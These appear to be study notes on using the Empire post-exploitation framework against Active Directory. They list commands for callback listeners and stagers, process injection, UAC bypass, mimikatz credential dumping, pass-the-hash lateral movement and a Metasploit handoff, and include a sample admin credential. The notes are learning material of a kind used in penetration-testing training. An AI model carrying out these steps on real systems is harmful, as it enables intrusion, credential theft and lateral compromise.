Empire is Designed as a post-Exploitation tool targeted primarily at Active Directory Environments 
	
commands : 
	(Empire) > help
		- This will display various commands  

Listeners and Stagers : 
	Listeners accepts inbound connection from various Empire agents 
	
	Stagers are the small pieces of code generated by Empire that are executed on victim and connect back
	to a listener. 
	They Setup connection between the victim and the attacker and perform additional tasks to facilitate
	the transfer of a staged payload. 
	
command : 
	(Empire) > listeners
		- This will print the available listeners 
	(Empire) > uselistener [tab] [tab] 
		- Display the List of Listeners 
	(Empire: listener/[]) > info
		- Display all the options 
	
	Set the Host value and Port using : 
	
	set Host [ipaddress]
	set Port [port_number ]

- DefaultDelay : Attempts to Simulate more legitimate HTTP Traffic by setting the wait interval callback 
		 time from the compromised host to the listener.

- DefaultJitter : makes the traffic seem less programmatically generated by settings DefaultDelay to a 
		  Random offset.

- KillDate : It will self terminate the listeners on all the compromised hosts on the specified date. 

Start the listener using "execute"

use "back" command

Now use "usestager [tab] [tab]" to list all the stagers 

set listener [listener name]

# The Empire Agent : 
	An agent is simply the final payload retrieved by the stager, and it allow to execute commands and 
	interact with the system. 

Now run the generated file on victim machine 
Now we can use the agents command to display all the agents 
To interact with any agent use : 
	interact [agent_name]

we can issue sysinfo command 

to get the list of all the command use "help"

# To migrate your payload to another process 
	list all the process using "ps" command
	run psinject [listener_name] [process_id]
	Now the new agent has been created and we have to maually switch to that agent 
	

# Powershell Modules : 
	
	Now while interacting with agent use "usemodule tab tab" to show all the modules 
	
# Situational Awareness : 
	The Primary Focus of this is on Local Client and Active Directory Enumeration 
	for Example : get_user Module 
		usemodule situational_awareness/network/powerview/get_user 
	
# Credentials and Privilege Escalation : 
	The "privesc" category contains privilege escalation Modules. 
	
	One of the important module is powerup/allchecks
	usemodule powershell/privesc/powerup/allchecks
	
	the 'bypassuac_fodhelper' module is quite useful if you have access to a local administrator 
	account. 

	Now you use credentials module to dump all cached credentials 
	usemodule credentials/mimikatz/logononpasswords
	
	The output is identical to mimikatz but the collected credentials are also written into the 
	credentials store, which can be enumerated with "creds". 

	we can also manually add the credentials using 
		creds add corp.com jeff_admin Qwerty99!
	
# Lateral Movement : 
	Once we gain valid user credentials, we can use them to log into additional systems until we 
	reach our objective. This is Known as Lateral Movement. 
	
	usemodule powershell/lateral_movement/invoke_smbex
	set the computer name
	set listener http
	set username 
	set hash 
	set domain 
	execute 
	

# Switching Between Empire and Metasploit 
	Create a payload using msfvenom and upload this payload using agents help 
	and run we get meterpreter using the help of agents
